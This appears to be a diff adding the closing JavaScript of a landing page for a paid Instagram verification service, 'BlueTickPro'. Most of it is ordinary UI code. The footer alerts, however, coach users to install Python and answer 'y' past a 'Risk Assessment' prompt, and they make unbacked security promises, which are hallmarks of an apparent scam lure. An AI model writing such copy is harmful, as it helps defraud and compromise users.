+                // Add active class to clicked tab
+                tab.classList.add('active');
+                
+                // Hide all instruction sections
+                mobileInstructions.classList.remove('active');
+                desktopInstructions.classList.remove('active');
+                
+                // Show selected instruction section
+                const platform = tab.dataset.platform;
+                if (platform === 'mobile') {
+                    mobileInstructions.classList.add('active');
+                } else {
+                    desktopInstructions.classList.add('active');
+                }
+            });
+        });
+
+        // Auto-detect platform and show appropriate instructions
+        function detectPlatform() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            if (isMobile) {
+                // Auto-select mobile tab on mobile devices
+                platformTabs[0].click();
+            } else {
+                // Auto-select desktop tab on desktop
+                platformTabs[1].click();
+            }
+        }
+        
+        // Detect platform on page load
+        window.addEventListener('load', detectPlatform);
+
+        // Smooth scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                if (targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    // Close mobile menu if open
+                    navLinks.classList.remove('active');
+                    mobileMenuBtn.querySelector('i').className = 'fas fa-bars';
+                    
+                    // Smooth scroll to target
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // CTA Button scroll to instructions
+        function scrollToInstructions() {
+            const instructionsSection = document.getElementById('instructions');
+            instructionsSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Helper functions for footer links
+        function showHelp() {
+            alert('Help Center\n\nFor help with verification:\n1. Follow the setup instructions carefully\n2. Make sure Python is installed\n3. Type "y" when Risk Assessment shows 2.3%\n4. Contact support@bluetickpro.com for further assistance');
+        }
+
+        function showContact() {
+            alert('Contact Information\n\nEmail: support@bluetickpro.com\nPhone: +91-XXX-XXX-XXXX\nHours: 24/7 Support\nResponse Time: < 1 hour');
+        }
+
+        function showTerms() {
+            alert('Terms of Service\n\n1. You must provide accurate information\n2. ₹699 fee is non-refundable once verification starts\n3. You must own the Instagram account\n4. We are not responsible for Instagram policy violations\n5. Service is for legitimate verification only');
+        }
+
+        function showPrivacy() {
+            alert('Privacy Policy\n\n1. We do not store your Instagram password\n2. All data is encrypted end-to-end\n3. No data sharing with third parties\n4. Verification data deleted after 30 days\n5. Industry-standard security measures');
+        }
+
+        // Add scroll effect to navbar
+        window.addEventListener('scroll', () => {
+            const navbar = document.querySelector('.navbar');
+            if (window.scrollY > 50) {
+                navbar.style.background = 'rgba(10, 15, 26, 0.98)';
+                navbar.style.backdropFilter = 'blur(20px)';
+            } else {
+                navbar.style.background = 'rgba(10, 15, 26, 0.95)';
+                navbar.style.backdropFilter = 'blur(20px)';
+            }
+        });
+
+        // Add hover effects to feature cards
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.addEventListener('mouseenter', () => {
+                const icon = card.querySelector('.feature-icon');
+                icon.style.transform = 'scale(1.2)';
+                icon.style.color = 'var(--accent)';
+            });
+            
+            card.addEventListener('mouseleave', () => {
+                const icon = card.querySelector('.feature-icon');
+                icon.style.transform = 'scale(1)';
+                icon.style.color = 'var(--primary)';
+            });
+        });
+
+        // Animate stats on scroll
+        function animateStats() {
+            const stats = document.querySelectorAll('.stat-number');
+            stats.forEach(stat => {
+                const finalValue = stat.textContent;
+                let currentValue = 0;
+                const increment = parseInt(finalValue) / 30;
+                
+                const timer = setInterval(() => {
+                    currentValue += increment;
+                    if (currentValue >= parseInt(finalValue)) {
+                        stat.textContent = finalValue;
+                        clearInterval(timer);
+                    } else {
+                        stat.textContent = Math.floor(currentValue);
+                    }
+                }, 50);
+            });
+        }
+
+        // Intersection Observer for animations
+        const observerOptions = {
+            threshold: 0.5
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    if (entry.target.classList.contains('stats-grid')) {
+                        animateStats();
+                    }
+                    entry.target.classList.add('animated');
+                }
+            });
+        }, observerOptions);
+
+        // Observe elements
+        document.querySelectorAll('.stats-grid, .feature-card, .process-step').forEach(el => {
+            observer.observe(el);
+        });
+
+    </script>
+</body>
+</html>
